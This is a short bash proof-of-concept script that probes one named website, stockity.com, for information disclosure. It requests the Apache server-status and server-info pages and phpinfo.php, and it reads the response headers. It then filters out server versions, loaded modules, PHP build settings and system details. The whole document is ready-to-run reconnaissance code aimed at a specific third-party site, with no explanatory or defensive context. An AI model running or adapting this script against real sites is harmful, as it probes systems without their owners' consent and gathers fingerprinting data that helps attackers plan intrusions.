#!/bin/bash
# Server Information Disclosure PoC

echo "[*] Gathering server information..."

# Check server status page
status=$(curl -s -I https://stockity.com/server-status | head -n 1)
if [ -n "$status" ]; then
    echo "[✓] Server status accessible"
    curl -s https://stockity.com/server-status | grep -E "Server Version|Server Uptime|Total Accesses|CPU Usage" | head -20
fi

# Check server info
info=$(curl -s -I https://stockity.com/server-info | head -n 1)
if [ -n "$info" ]; then
    echo "[✓] Server info accessible"
    curl -s https://stockity.com/server-info | grep -E "Server Version|Apache|PHP|Module|Loaded" | head -20
fi

# Check PHP info
phpinfo=$(curl -s -I https://stockity.com/phpinfo.php | head -n 1)
if [ -n "$phpinfo" ]; then
    echo "[✓] PHP info accessible"
    curl -s https://stockity.com/phpinfo.php | grep -E "PHP Version|System|Configure Command|Server API" | head -20
fi

# Check headers for server info
echo "[*] Analyzing response headers..."
curl -s -I https://stockity.com/ | grep -E "Server|X-Powered-By|X-AspNet-Version|X-AspNetMvc-Version"